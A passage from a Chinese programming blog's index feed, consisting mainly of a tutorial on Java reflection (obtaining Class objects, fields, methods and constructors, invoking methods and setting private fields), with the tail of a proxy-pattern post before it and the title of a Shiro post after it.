function">setUserService</span><span class="token punctuation">(</span>userService<span class="token punctuation">)</span><span class="token punctuation">;</span>        UserService proxy <span class="token operator">=</span> <span class="token punctuation">(</span>UserService<span class="token punctuation">)</span> userServiceProxy<span class="token punctuation">.</span><span class="token function">getproxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221024032224304.png"></p><h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="https://jasonkayzk.github.io/2019/09/18/Java%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F-%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">Java中的代理模式-静态代理与动态代理</a></p><p><a href="https://segmentfault.com/a/1190000011291179">Java三种代理模式：静态代理、动态代理和cglib代理</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java之反射</title>
      <link href="/2022/10/15/java-zhi-fan-she/"/>
      <url>/2022/10/15/java-zhi-fan-she/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>旧梦很美，虽未能实现，但我很欣慰它们曾萦绕心田。</p><h2 id="0x01-什么是反射"><a href="#0x01-什么是反射" class="headerlink" title="0x01 什么是反射"></a>0x01 什么是反射</h2><p>反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。有点java基础的人都知道如果我们要调用一个对象的方法或者属性，通过会传入一个实例，比如以下代码块：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        User u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>u<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码基于你能获取User类的情况下，那如果没法获取User类能不能实现以上代码的功能呢，答案是可以的，这里我们讲的反射就是为了解决在运行期，对某个实例一无所知的情况下，如何调用其方法和属性。</p><h2 id="0x02-Class类"><a href="#0x02-Class类" class="headerlink" title="0x02 Class类"></a>0x02 Class类</h2><p>在java中，除了int基本类型外，其他类型全部是class(包括interface)，而class是由JVM在执行过程中动态加载的，每加载一种class，JVM就为其创建一个Class（即一个class在内存中只有一个Class对象），这里的Class类型是一个名叫Class的class：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Class</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token function">Class</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个Class实例是由JVM创建的，我们自己编写的java程序是无法创建Class实例的。</p><p>由上所述，我们很容易知道一个Class实例包含了该class的所有完整信息，包括类名、包名、父类、实现的接口、类的属性、方法等，<strong>这种通过Class实例获取class信息的方法称为反射</strong>。</p><h2 id="0x03-使用方法"><a href="#0x03-使用方法" class="headerlink" title="0x03 使用方法"></a>0x03 使用方法</h2><h3 id="1、获取class的Class实例"><a href="#1、获取class的Class实例" class="headerlink" title="1、获取class的Class实例"></a>1、获取class的Class实例</h3><p>1）、通过静态变量class获取</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Class <span class="token class-name">userClass</span> <span class="token operator">=</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>userClass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）、通过getClass()方法获取</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>aClass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3)、通过静态方法Class.forName()获取(前提需要知道完整的包名)</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.root.pojo.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>aClass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、类名的获取"><a href="#2、类名的获取" class="headerlink" title="2、类名的获取"></a>2、类名的获取</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.root.pojo.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取对象</span>        String name <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String simpleName <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过getName()获取:"</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过getSimpleName()获取:"</span><span class="token operator">+</span>simpleName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221015182129017.png"></p><h3 id="3、类属性的获取"><a href="#3、类属性的获取" class="headerlink" title="3、类属性的获取"></a>3、类属性的获取</h3><p>Class提供了以下几个方法来获取属性</p><ul><li>Field getField(name)：根据字段名获取某个public的属性</li><li>Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</li><li>Field[] getFields()：获取所有public的属性（包括父类）</li><li>Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）</li></ul><p>示例代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.root.pojo.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取对象</span>        Field user <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getField获取的信息:"</span><span class="token operator">+</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field field <span class="token operator">:</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getFields()获取的信息:"</span><span class="token operator">+</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Field username <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getDeclaredField()获取的信息:"</span><span class="token operator">+</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> declaredFields <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field declaredField <span class="token operator">:</span> declaredFields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getDeclaredFields()获取的信息:"</span><span class="token operator">+</span>declaredField<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221015183718147.png"></p><p>当我们获取了Field对象后，我们就能通过这个Field对象获取字段的所有信息：</p><ul><li><code>getName()</code>：返回字段名称，例如，<code>&quot;name&quot;</code>；</li><li><code>getType()</code>：返回字段类型，也是一个<code>Class</code>实例，例如，<code>String.class</code>；</li><li><code>getModifiers()</code>：返回字段的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li></ul><h3 id="4、获取class的方法"><a href="#4、获取class的方法" class="headerlink" title="4、获取class的方法"></a>4、获取class的方法</h3><p>Class类提供了以下几个方法来获取class的方法</p><ul><li><code>Method getMethod(name, Class...)</code>：只能获取public的指定Method</li><li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的指定<code>Method</code>（包括public和private）</li><li><code>Method[] getMethods()</code>：获取所有<code>public</code>属性的<code>Method</code></li><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（包括public和private）</li></ul><p>示例代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException <span class="token punctuation">{</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Method method <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getUsername"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getMethod方法："</span><span class="token operator">+</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        Method<span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Method method1 <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getMethods方法："</span><span class="token operator">+</span>method1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Method toString <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod方法"</span><span class="token operator">+</span>toString<span class="token punctuation">)</span><span class="token punctuation">;</span>        Method<span class="token punctuation">[</span><span class="token punctuation">]</span> declaredMethods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Method declaredMethod <span class="token operator">:</span> declaredMethods<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethods方法"</span><span class="token operator">+</span>declaredMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221015195553580.png"></p><h3 id="5、调用构造器"><a href="#5、调用构造器" class="headerlink" title="5、调用构造器"></a>5、调用构造器</h3><p>通常来说，我们创建一个对象可以用以下代码来实现</p><pre class="line-numbers language-java"><code class="language-java">User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过反射创建实例，我们可以调用newInstance()方法：</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">aClass</span> <span class="token operator">=</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>User o <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>调用newInstance()方法也是有限制的，它需要满足两个条件</p><ul><li>类必须有一个无参的构造器</li><li>类的构造器访问权限需要足够</li></ul><p>那么是不是没有无参构造器就不能创建对象了呢，答案是否定的，只要操作的时候明确调用类中的构造器，并将参数传递进去之后，才可以实例化操作。我们可以通过以下代码来看看具体的实现。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        User o <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建对象</span>        <span class="token comment" spellcheck="true">//通过构造器创建对象</span>        Constructor constructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        User o1 <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"李强"</span><span class="token punctuation">,</span> <span class="token string">"1234565"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单说下上面代码的实现逻辑，首先通过Class的getDeclaredConstructor方法取得本类的指定形参类型的构造器，然后向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数，最后通过Constructor实例化对象。</p><h3 id="6、调用方法"><a href="#6、调用方法" class="headerlink" title="6、调用方法"></a>6、调用方法</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        User o2 <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建对象</span>        Method setUsername <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"setUsername"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取方法</span>        setUsername<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o2<span class="token punctuation">,</span><span class="token string">"李强"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过invoke(对象，参数)    调用方法</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过反射调用方法:"</span><span class="token operator">+</span>o2<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7、调用属性"><a href="#7、调用属性" class="headerlink" title="7、调用属性"></a>7、调用属性</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>root<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        User o3 <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建对象</span>        Field username <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        username<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        username<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>o3<span class="token punctuation">,</span><span class="token string">"李强"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过反射操作属性:"</span><span class="token operator">+</span>o3<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里重点讲下setAccessible()这个方法，因为这里的username是私有的，我们没办法直接调用它，因此需要通过setAccessible()来取消安全检测，允许访问私有属性，默认是false，私有方法也是一样：<code>方法..setAccessible(true) </code></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>学好反射，为后面学习反序列化打好基础，关于反射还有其他的骚操作，后面再补充学习吧。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java之Shiro认证与授权</title>
      <link href="/2022/10/13/java-zhi-shiro-ren-zheng-yu-shou-quan/"/>
      <url>/2022/10/13/java-zhi-shiro-ren-zheng-yu-shou-quan/</url>
      
